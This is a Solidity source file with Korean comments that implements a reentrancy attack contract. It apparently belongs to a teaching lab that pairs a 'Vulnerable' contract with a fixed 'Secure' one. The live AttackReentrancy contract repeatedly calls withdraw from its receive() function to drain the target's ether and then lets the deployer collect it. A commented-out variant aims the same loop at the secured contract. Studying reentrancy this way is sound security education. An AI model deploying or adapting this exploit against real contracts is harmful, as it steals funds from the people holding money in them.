// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Vulnerable.sol";

contract AttackReentrancy {
    //우리가 공격할 취약한 컨트랙트를 외부에서 받아서 저장
    Vulnerable public vulnerable;
    // 이 공격 컨트랙트를 배포한 사람 → 이 주소만 공격 이후의 자금을 회수할 수 있도록 권한 설정
    address public owner;

    //Vulnerable 컨트랙트는 외부에서 이미 배포되어 있는 상태야.
    //AttackReentrancy는 그 이미 배포된 취약한 컨트랙트 주소를 받아서 공격 대상으로 설정하는 거야.
    //즉, AttackReentrancy는 Vulnerable을 호출해서 조작할 목적이기 때문에 주소가 필요해.
    constructor(address payable _vulnerableAddress) {
        //해당 주소에 있는 Vulnerable 컨트랙트를 vulnerable 변수로 다루겠다
        vulnerable = Vulnerable(_vulnerableAddress);
        owner = msg.sender;
    }
    
    // receive()는 재진입을 “지속”시키는 루프 포인트
    // withdraw() 실행 → ETH가 공격 컨트랙트로 들어옴 → receive() 실행됨 → 거기서 또 withdraw() 실행됨...
    receive() external payable {
        if (address(vulnerable).balance >= 1 ether) {
            vulnerable.withdraw(1 ether);
        }
    }

    //attack()은 재진입 공격을 “시작”하는 트리거
    function attack() external payable {
        require(msg.value >= 1 ether);
        vulnerable.donate{value: 1 ether}();
        vulnerable.withdraw(1 ether);                     // 출금 시작 (이 때 receive()가 발동)
    }

    function withdrawFunds() external {
        require(msg.sender == owner);
        payable(owner).transfer(address(this).balance);
    }
}

// // ✅ contracts/AttackSecure.sol (Secure 대응 공격 컨트랙트)
// pragma solidity ^0.8.0;

// import "./Secure.sol";

// contract AttackSecure {
//     Secure public secure;
//     address public owner;
//     uint public reentryCount;

//     constructor(address payable _secureAddress) {
//         secure = Secure(_secureAddress);
//         owner = msg.sender;
//     }

//     receive() external payable {
//         reentryCount++;
//         if (reentryCount < 5 && address(secure).balance >= 1 ether) {
//             secure.withdraw(1 ether);
//         }
//     }

//     function attack() external payable {
//         require(msg.value >= 1 ether, "Need at least 1 ether");
//         secure.donate{value: 1 ether}();
//         secure.withdraw(1 ether);
//     }

//     function withdrawFunds() external {
//         require(msg.sender == owner, "Not owner");
//         payable(owner).transfer(address(this).balance);
//     }
// }